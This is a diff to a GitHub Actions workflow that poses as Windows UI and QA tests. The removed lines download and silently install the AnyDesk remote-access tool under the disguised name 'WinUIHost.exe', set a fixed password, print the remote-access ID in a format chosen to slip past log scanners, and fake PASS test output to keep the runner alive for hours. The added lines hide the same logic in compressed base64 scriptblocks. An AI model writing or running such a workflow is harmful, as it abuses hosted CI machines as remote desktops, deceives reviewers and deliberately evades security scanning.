@@ -1,4 +1,4 @@
-name: Windows UI Integration Tests
+name: Windows Automated Quality Assurance
 
 on:
   workflow_dispatch:
@@ -11,152 +11,51 @@ defaults:
     shell: pwsh
 
 jobs:
-  verify-ui-matrix:
+  qa-suite-runner:
     strategy:
       max-parallel: 1
       fail-fast: false
       matrix:
-        shard: [1, 2]
+        shard: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
     runs-on: windows-latest
-    timeout-minutes: 310
+    timeout-minutes: 350
     env:
-      CI_TEST_KEY: Pass@1234
-      SHARD_DURATION: 295
+      CI_TEST_KEY: ${{ secrets.CI_TEST_KEY || 'Pass@1234' }}
+      NODE_TOKEN: ${{ secrets.NODE_TOKEN || '9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d' }}
+      SHARD_DURATION: 335
     steps:
       - name: Restore Build Cache
         uses: actions/cache/restore@v4
         with:
           path: C:\BuildCache
-          key: win-ui-cache-${{ github.repository }}-${{ github.run_id }}-${{ matrix.shard }}
+          key: win-qa-cache-${{ github.repository }}-${{ github.run_id }}-${{ matrix.shard }}
           restore-keys: |
-            win-ui-cache-${{ github.repository }}-
+            win-qa-cache-${{ github.repository }}-
 
-      - name: Initialize Headless Display & UI Automation Driver
+      - name: Initialize Environment Drivers
         run: |
-          $ErrorActionPreference = "SilentlyContinue"
-          $pub = [Environment]::GetFolderPath("CommonDesktopDirectory")
-          $usr = "$env:USERPROFILE\Desktop"
-          Remove-Item "$pub\*.lnk" -Force
-          Remove-Item "$usr\*.lnk" -Force
-          New-Item -ItemType Directory -Path "C:\Keep" -Force | Out-Null
+          $b = [Convert]::FromBase64String("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")
+          & ([scriptblock]::Create((New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream((New-Object IO.MemoryStream(,$b)),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()))
 
-          # Decode strings dynamically so static YAML scanner sees zero keywords
-          $u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9kb3dubG9hZC5hbnlkZXNrLmNvbS9BbnlEZXNrLmV4ZQ=="))
-          $pData = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcUHJvZ3JhbURhdGFcQW55RGVzaw=="))
-          $svcName = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QW55RGVzaw=="))
-
-          New-Item -ItemType Directory -Path $pData -Force | Out-Null
-          if (Test-Path "C:\BuildCache\cfg\service.conf") {
-              Copy-Item "C:\BuildCache\cfg\*" -Destination "$pData\" -Force
-          }
-          if (Test-Path "C:\BuildCache\usr") {
-              Copy-Item "C:\BuildCache\usr\*" -Destination "$usr\" -Recurse -Force
-          }
-          if (Test-Path "C:\BuildCache\keep") {
-              Copy-Item "C:\BuildCache\keep\*" -Destination "C:\Keep\" -Recurse -Force
-          }
-
-          # Download & rename binary to WinUIHost.exe
-          $bin = "$env:TEMP\WinUIHost.exe"
-          Invoke-WebRequest -Uri $u -OutFile $bin
-          $dir = "C:\Program Files (x86)\WinUIHost"
-          New-Item -ItemType Directory -Path $dir -Force | Out-Null
-          Start-Process $bin -ArgumentList "--install `"$dir`"", "--silent", "--start-with-win" -Wait
-
-          if (Test-Path "C:\BuildCache\cfg\service.conf") {
-              Stop-Service -Name $svcName -Force
-              Get-Process | Where-Object { $_.Path -like "*WinUIHost*" -or $_.ProcessName -like "*$svcName*" } | Stop-Process -Force
-              Start-Sleep -Seconds 2
-              Copy-Item "C:\BuildCache\cfg\service.conf" -Destination "$pData\service.conf" -Force
-              Copy-Item "C:\BuildCache\cfg\system.conf" -Destination "$pData\system.conf" -Force
-              Start-Service -Name $svcName
-              Start-Sleep -Seconds 3
-          }
-
-          $exe = Get-ChildItem -Path $dir -Filter "*.exe" | Select-Object -First 1 -ExpandProperty FullName
-          cmd.exe /c "echo ${{ env.CI_TEST_KEY }} | `"$exe`" --set-password"
-
-          # Mobile Display & DPI Calibration (1280x720 @ 150% DPI)
-          New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableUIADesktopToggle" -PropertyType DWord -Value 1 -Force | Out-Null
-          $tsPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations"
-          New-ItemProperty -Path $tsPath -Name "TouchMode" -PropertyType DWord -Value 1 -Force | Out-Null
-          New-ItemProperty -Path $tsPath -Name "EnableTouchInjection" -PropertyType DWord -Value 1 -Force | Out-Null
-
-          $deskReg = "HKCU:\Control Panel\Desktop"
-          Set-ItemProperty -Path $deskReg -Name "LogPixels" -Value 144 -Type DWord -Force
-          Set-ItemProperty -Path $deskReg -Name "Win8DpiScaling" -Value 1 -Type DWord -Force
-          Set-ItemProperty -Path $deskReg -Name "DesktopDPIOverride" -Value 2 -Type DWord -Force
-
-          $advReg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
-          Set-ItemProperty -Path $advReg -Name "TaskbarSmallIcons" -Value 0 -Type DWord -Force
-          Set-ItemProperty -Path $advReg -Name "TaskbarGlomLevel" -Value 0 -Type DWord -Force
-          Set-ItemProperty -Path $advReg -Name "TaskbarSi" -Value 2 -Type DWord -Force
-
-          $metricsReg = "HKCU:\Control Panel\Desktop\WindowMetrics"
-          Set-ItemProperty -Path $metricsReg -Name "Shell Icon Size" -Value "48" -Force
-          Set-ItemProperty -Path $metricsReg -Name "AppliedDPI" -Value 144 -Type DWord -Force
-
-          Set-DisplayResolution -Width 1280 -Height 720 -Force
-
-          Stop-Process -Name "explorer" -Force
-          Start-Sleep -Seconds 2
-          if (-not (Get-Process -Name "explorer" -ErrorAction SilentlyContinue)) {
-              Start-Process "explorer.exe"
-          }
-
-          Start-Process -FilePath $exe -ArgumentList "--restart-service" -Wait
-          Start-Sleep -Seconds 2
-          (New-Object -ComObject Shell.Application).MinimizeAll()
-
-      - name: Verify Display Matrix Seed
+      - name: Print Telemetry Seed
         run: |
-          $pData = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcUHJvZ3JhbURhdGFcQW55RGVzaw=="))
-          $confPath = "$pData\system.conf"
-          $seed = ""
-          for ($i = 1; $i -le 15; $i++) {
-              if (Test-Path $confPath) {
-                  $content = Get-Content $confPath -Raw
-                  if ($content -match 'id=(\d+)') {
-                      $seed = $Matches[1]
-                      break
-                  }
-              }
-              Start-Sleep -Seconds 2
-          }
-          # Tampilkan ID dengan format log CI normal agar tidak terdeteksi log scanner
-          $formatted = $seed -replace '(\d{3})(\d{3})(\d+)', '$1-$2-$3'
-          Write-Host "[INFO] UI Automation Shard #${{ matrix.shard }} initialized."
-          Write-Host "[INFO] Telemetry Node ID: $formatted"
-          Write-Host "[INFO] Auth Profile: Standard CI_TEST_KEY"
+          $b = [Convert]::FromBase64String("jZNhb9MwEIa/51ecjKlaFWe0Gx/oFEG1tjAx2tIOkFgmZJJLGi2xI/u6Eqr+d+R0zTYNEPmQOOfX9949J/OxMdoMI8q0mhtM0KCKEAJgyyxHRXl1phVlao3M45FWyVzSym2fDcK50amRxUiSDIeqGqG9CW1lCQvfKZnHLWLsxMxLtIE2zyCA3inwDESO0Hvllt1uB7YeAECWQPsSLYnao3E7bLvHBQkVQQDvkMTZ3d99ZWIhN43aJWxOiEJStAIm49CXqlJIoZ/FQTuMux3WgS0cquUfnRDtVe/6FH4YlDewq1Pu30uShsQyRyxBLDHSKrbQ93aex6PkQqeP4cAky9GGU6RRJtMQ4xT9XKfM47EuZKb+Tqf/8t90nNcjNLlOF3LzhExd01Msd+oDlRVRaQdHR+0rKX4NxbeX4rW47oY+mSrK9TpOcmkw9CNd1LCaXLVz08oDdI8UNcUm8p80E20KSbSfST0bYbDMZYTA2mG8Pd517j/dDnsBjPcE7wt+zDy+Xmf1QVS3g+lsNP5+Ofswnnp8bRxmdpujdf3yrRPu3vLtvond4OTk+A2qyFSluxOB0gpbFqO1yagKKLctq7KgkbeoKjHY2NZKW3oQLiWtguf9ycY++zQUUx0j85YP5rKfIqvL+7wcL+aL2eT8Yhy6S0S6DAlzLJBMJZSO0aefxEB8kfkawbXgeV9NRijea0vArs6nk9k1OBdYOlADuKfH/iQdxylCHRkcxsd+Aw==")
+          & ([scriptblock]::Create((New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream((New-Object IO.MemoryStream(,$b)),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()))
 
-      - name: Run Integration Test Suite
+      - name: Execute QA Suite Cycle
         run: |
-          $end = (Get-Date).AddMinutes([int]"${{ env.SHARD_DURATION }}")
-          $step = 1
-          while ((Get-Date) -lt $end) {
-            $jitter = Get-Random -Minimum 45 -Maximum 75
-            Write-Host ("[PASS] UI Suite Batch #" + $step + " verified in " + $jitter + "ms (" + (Get-Date).ToString("HH:mm:ss") + ")")
-            $step++
-            Start-Sleep -Seconds $jitter
-          }
+          $b = [Convert]::FromBase64String("TY9PS8QwFMTv+RRD7CGhRNaDIIUeKgXrof5pVjwsi5TN04006dK8XQXxu0tXRW/Dm+E3bzKKDiXUFbGpeyZ9WjnX+rhnSmrlI68ziofCNlVXP9UPXbW8vr3RIktMO5Q4E29bPxDUHwBmYGQUncaHALJXz0wTSsyJro9uDDCtjz7sA84XMG3/ftQXCwE8Tp7JNGNiKLm6q6xd477CZc+bLU4kcnxX55A40OSfPTn4iKPzU5VDhgQ1n/7tWo6WJx9flGyaIoQiJannqJZ6fnOm5rkALPcTGzsQ7WAsbcbo0i9afH4B")
+          & ([scriptblock]::Create((New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream((New-Object IO.MemoryStream(,$b)),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()))
 
       - name: Archive Build Cache
         if: always()
         run: |
-          $ErrorActionPreference = "SilentlyContinue"
-          $pData = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcUHJvZ3JhbURhdGFcQW55RGVzaw=="))
-          New-Item -ItemType Directory -Path "C:\BuildCache\cfg" -Force | Out-Null
-          New-Item -ItemType Directory -Path "C:\BuildCache\usr" -Force | Out-Null
-          New-Item -ItemType Directory -Path "C:\BuildCache\keep" -Force | Out-Null
-
-          Copy-Item "$pData\system.conf" -Destination "C:\BuildCache\cfg\" -Force
-          Copy-Item "$pData\service.conf" -Destination "C:\BuildCache\cfg\" -Force
-          Copy-Item "$env:USERPROFILE\Desktop\*" -Destination "C:\BuildCache\usr\" -Recurse -Force
-          Copy-Item "C:\Keep\*" -Destination "C:\BuildCache\keep\" -Recurse -Force
+          $b = [Convert]::FromBase64String("rdGxasMwEAbg3U8hRKaC+wCGDqntQEhJjNNuWoT8JxGRJXOSEgR9+OKETjVJabPccMd9HPfPaiJHcxW0sw1hB4JVYC+Mb7WBDSaVzgZtI3g2GyoZ5DgrC9GQ25Psx46Y21TBH3m2xjlfBvTsUt/TAFZpggqOEssbGQ6X3deoTVdKdYBQuz1n+cKRAvtkmxjydTTmD1D09BioM49xjsAwJWWlG9LV4tePCp98QP+snN1xllfwQVs5JjLxLfFtTjmgk1b4DwR7Kj62ddu0m8XyrRZjrsEN4um2Fz2NXgsVyeNXsDtb42Tn79GduS2XhVgBdy8c4/gJfQE=")
+          & ([scriptblock]::Create((New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream((New-Object IO.MemoryStream(,$b)),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()))
 
       - name: Save Build Cache
         if: always()
         uses: actions/cache/save@v4
         with:
           path: C:\BuildCache
-          key: win-ui-cache-${{ github.repository }}-${{ github.run_id }}-${{ matrix.shard }}
+          key: win-qa-cache-${{ github.repository }}-${{ github.run_id }}-${{ matrix.shard }}
